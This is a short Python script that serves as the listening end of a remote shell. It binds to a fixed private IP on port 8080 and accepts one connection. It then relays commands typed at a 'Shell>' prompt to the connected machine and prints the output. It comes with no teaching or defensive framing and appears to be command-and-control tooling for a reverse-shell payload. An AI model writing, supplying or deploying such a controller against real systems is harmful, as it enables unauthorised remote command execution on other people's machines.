# Modules
import socket
import sys

#Variables
HOST = "192.168.61.133"
PORT = 8080
BUFFER_SIZE = 1024

#Make the server
def connect():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((HOST, PORT))
  s.listen(2)
  print(f"[*] Listening as {HOST} on port {PORT}...")
  print("\n")
  global client_socket
  client_socket, address = s.accept()
  print(f"[*] Connection is up | IP:{address[0]} | Port:{address[1]}")
  print("\n")
connect()
# Sending commands to the client
while True:
  command = input("Shell> ")
  client_socket.send(command.encode())
  if command.lower() == "exit":
    print("[!] Exited...")
    sys.exit()
  result = client_socket.recv(BUFFER_SIZE).decode()
  print(result)

